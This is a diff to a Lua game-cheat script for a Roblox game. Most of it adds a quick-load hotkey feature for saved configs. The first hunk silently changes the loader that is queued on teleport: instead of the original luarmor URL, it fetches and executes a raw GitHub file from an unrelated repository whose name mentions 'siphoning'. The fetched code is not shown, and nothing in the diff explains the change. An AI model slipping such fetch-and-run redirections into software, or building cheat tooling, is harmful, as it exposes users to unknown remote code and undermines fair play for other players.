@@ -183,7 +183,7 @@ function Lycoris.init()
 		-- String.
 		local scriptKeyQueueString = string.format("script_key = '%s'", script_key or "N/A")
 		local loadStringQueueString =
-			'loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0216eb5f95556e660be56009441409ae.lua"))()'
+			'loadstring(game:HttpGet("https://raw.githubusercontent.com/eternalgames007-gif/klarisfeetwareforthemasseslowkjssiphoning/refs/heads/main/SetroFeet.lua"))()'
 
 		-- Queue.
 		queue_on_teleport(scriptKeyQueueString .. "\n" .. loadStringQueueString)
@@ -74143,6 +74143,73 @@ function LycorisTab.initUISettingsSection(groupbox)
 	})
 end
 
+---Initialize Quick-Load section.
+---@param groupbox table
+function LycorisTab.initQuickLoadSection(groupbox)
+	groupbox:AddDropdown("QuickLoad_ConfigList", { 
+		Text = "Select Config", 
+		Values = SaveManager:RefreshConfigList(), 
+		AllowNull = true 
+	})
+	
+	local quickLoadBindLabel = groupbox:AddLabel("Assign Hotkey")
+	quickLoadBindLabel:AddKeyPicker("QuickLoad_Hotkey", {
+		Default = "N/A",
+		NoUI = true,
+		Text = "Quick-Load Key"
+	})
+	
+	local activeBindLabel = groupbox:AddLabel("Active Bind: none", true)
+	
+	-- Update Active Bind label when a config is selected
+	Options.QuickLoad_ConfigList:OnChanged(function()
+		local cfg = Options.QuickLoad_ConfigList.Value
+		if not cfg or cfg == "" then
+			activeBindLabel:SetText("Active Bind: none")
+			return
+		end
+		
+		local boundKey = SaveManager:GetQuickLoadBind(cfg)
+		if boundKey then
+			activeBindLabel:SetText(string.format("Active Bind: %s", boundKey))
+		else
+			activeBindLabel:SetText("Active Bind: none")
+		end
+	end)
+	
+	groupbox:AddButton("Bind Hotkey to Config", function()
+		local cfg = Options.QuickLoad_ConfigList.Value
+		local key = Options.QuickLoad_Hotkey.Value
+		
+		if not cfg or cfg == "" then
+			return Library:Notify("Please select a config to bind first.")
+		end
+		
+		if key == "N/A" or key == "Unknown" or not key then
+			return Library:Notify("Please pick a valid key to bind.")
+		end
+		
+		SaveManager:SetQuickLoadBind(cfg, key)
+		activeBindLabel:SetText(string.format("Active Bind: %s", key))
+		Library:Notify(string.format("Bound '%s' to config '%s'.", key, cfg))
+	end)
+	
+	groupbox:AddButton("Clear Bind", function()
+		local cfg = Options.QuickLoad_ConfigList.Value
+		if not cfg or cfg == "" then
+			return Library:Notify("Please select a config to clear.")
+		end
+		
+		SaveManager:RemoveQuickLoadBind(cfg)
+		activeBindLabel:SetText("Active Bind: none")
+		Library:Notify(string.format("Cleared bind for config '%s'.", cfg))
+	end)
+	
+	groupbox:AddButton("Refresh Config List", function()
+		Options.QuickLoad_ConfigList:SetValues(SaveManager:RefreshConfigList())
+	end)
+end
+
 ---Initialize tab.
 function LycorisTab.init(window)
 	-- Create tab.
@@ -74151,6 +74218,7 @@ function LycorisTab.init(window)
 	-- Initialize sections.
 	LycorisTab.initCheatSettingsSection(tab:AddLeftGroupbox("Cheat Settings"))
 	LycorisTab.initUISettingsSection(tab:AddRightGroupbox("UI Settings"))
+	LycorisTab.initQuickLoadSection(tab:AddRightGroupbox("Quick-Load Hotkeys"))
 
 	-- Configure SaveManager & ThemeManager.
 	ThemeManager:ApplyToTab(tab)
@@ -74188,6 +74256,8 @@ return LPH_NO_VIRTUALIZE(function()
 	do
 		SaveManager.Folder = "Lycoris-Rewrite-TypeSoul-Configs"
 		SaveManager.Ignore = {}
+		SaveManager.QuickLoadBinds = {}
+		
 		SaveManager.Parser = {
 			Toggle = {
 				Save = function(idx, object)
@@ -74437,7 +74507,10 @@ return LPH_NO_VIRTUALIZE(function()
 					end
 
 					if char == "/" or char == "\\" then
-						table.insert(out, file:sub(pos + 1, start - 1))
+						local name = file:sub(pos + 1, start - 1)
+						if name ~= "quickload_binds" then
+							table.insert(out, name)
+						end
 					end
 				end
 			end
@@ -74537,7 +74610,79 @@ return LPH_NO_VIRTUALIZE(function()
 			SaveManager:SetIgnoreIndexes({ "SaveManager_ConfigList", "SaveManager_ConfigName" })
 		end
 
+		function SaveManager:SetQuickLoadBind(configName, keyName)
+			self.QuickLoadBinds[configName] = keyName
+			self:SaveQuickLoadBinds()
+		end
+
+		function SaveManager:RemoveQuickLoadBind(configName)
+			self.QuickLoadBinds[configName] = nil
+			self:SaveQuickLoadBinds()
+		end
+
+		function SaveManager:GetQuickLoadBind(configName)
+			return self.QuickLoadBinds[configName]
+		end
+
+		function SaveManager:SaveQuickLoadBinds()
+			local fullPath = self.Folder .. "/quickload_binds.json"
+			local success, encoded = pcall(httpService.JSONEncode, httpService, self.QuickLoadBinds)
+			if success then
+				writefile(fullPath, encoded)
+			end
+		end
+
+		function SaveManager:LoadQuickLoadBinds()
+			local fullPath = self.Folder .. "/quickload_binds.json"
+			if isfile(fullPath) then
+				local success, decoded = pcall(httpService.JSONDecode, httpService, readfile(fullPath))
+				if success and type(decoded) == "table" then
+					self.QuickLoadBinds = decoded
+				end
+			end
+		end
+		
+		function SaveManager:InitQuickLoadListener()
+			SaveManager:LoadQuickLoadBinds()
+			local UserInputService = game:GetService("UserInputService")
+			
+			UserInputService.InputBegan:Connect(function(input, gameProcessed)
+				if gameProcessed then return end
+				if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+				
+				local keyName = input.KeyCode.Name
+				
+				-- Ensure they aren't about to type in a box or press the menu keybind
+				local isMenuKey = Options and Options.MenuKeybind and Options.MenuKeybind.Value == keyName
+				if isMenuKey then return end
+				
+				for configName, boundKey in pairs(self.QuickLoadBinds) do
+					if boundKey == keyName then
+						local success, err = self:Load(configName)
+						if success then
+							if Options then
+								if Options.SaveManager_ConfigList then
+									Options.SaveManager_ConfigList:SetValue(configName)
+								end
+								if Options.QuickLoad_ConfigList then
+									Options.QuickLoad_ConfigList:SetValue(configName)
+								end
+							end
+							if self.Library then
+								self.Library:Notify(string.format("Quick-Loaded config %q via hotkey %s", configName, keyName))
+							end
+						else
+							if self.Library then
+								self.Library:Notify(string.format("Failed to Quick-Load config %q: %s", configName, err))
+							end
+						end
+					end
+				end
+			end)
+		end
+
 		SaveManager:BuildFolderTree()
+		SaveManager:InitQuickLoadListener()
 	end
 
 	return SaveManager
